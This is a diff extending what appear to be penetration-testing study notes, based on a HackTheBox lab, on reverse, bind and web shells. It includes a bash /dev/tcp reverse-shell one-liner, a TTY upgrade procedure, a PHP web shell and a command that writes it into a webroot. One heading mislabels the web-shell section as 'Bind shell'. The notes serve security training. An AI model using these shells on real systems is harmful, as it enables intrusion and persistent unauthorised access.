@@ -248,9 +248,9 @@ It is the most common way. Once we identify a vulnerability on the remote host t
 
 The -l means listen mode so to wait for a connection to connect to us. The -v is for verbose. The -n disbable DNS resolution and only connect from/to IPs, to speed up the connection, and the -p is the port number `netcat` is listening on, and the reverse connection should be sent to.&#x20;
 
-However, first, we need to find our system's IP to send a reverse connection back to us. We can find our IP with the command : ip address
+However, first, we need to find our system's IP to send a reverse connection back to us. We can find our IP with the command : ip address. In fact, in our case we took the tun0 because we need a vpn to connect to our box machine but in the real world either we are directly connected or we connect remotely to the server.
 
-The command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access
+After that, the command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access.
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
@@ -289,4 +289,100 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-&#x20;&#x20;
+As we can see, we are directly dropped into a bash session and can interact with the target system directly. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
+
+Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.
+
+we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
+
+```shell-session
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:
+
+&#x20; Upgrading TTY
+
+```shell-session
+www-data@remotehost$ ^Z
+
+ebs123@htb[/htb]$ stty raw -echo
+ebs123@htb[/htb]$ fg
+
+[Enter]
+[Enter]
+www-data@remotehost$
+```
+
+Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
+
+We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:
+
+```shell-session
+ebs123@htb[/htb]$ echo $TERM
+
+xterm-256color
+```
+
+```shell-session
+ebs123@htb[/htb]$ stty size
+
+67 318
+```
+
+The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:
+
+```shell-session
+www-data@remotehost$ export TERM=xterm-256color
+
+www-data@remotehost$ stty rows 67 columns 318
+```
+
+Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.
+
+## <mark style="color:blue;">Bind shell</mark> &#x20;
+
+&#x20;A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page. First of all, we need to write our web shell that would take our command through a `GET` request. This is an example where we do it wih php.&#x20;
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. `shell.php` and upload it, and then access our uploaded file to execute commands.
+
+However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:
+
+| Web Server | Default Webroot        |
+| ---------- | ---------------------- |
+| `Apache`   | /var/www/html/         |
+| `Nginx`    | /usr/local/nginx/html/ |
+| `IIS`      | c:\inetpub\wwwroot\\   |
+| `XAMPP`    | C:\xampp\htdocs\\      |
+
+We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:
+
+Code: bash
+
+```bash
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
+
+**Accessing Web Shell**
+
+Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:
+
+&#x20;  ![](https://academy.hackthebox.com/storage/modules/33/write\_shell\_exec\_1.png)
+
+Another option is to use `cURL`:
+
+&#x20; Accessing Web Shell
+
+```shell-session
+ebs123@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on `80` or `443`, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.
+
+On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a `Python` script to automate this process and give us a semi-interactive web shell right within our terminal.
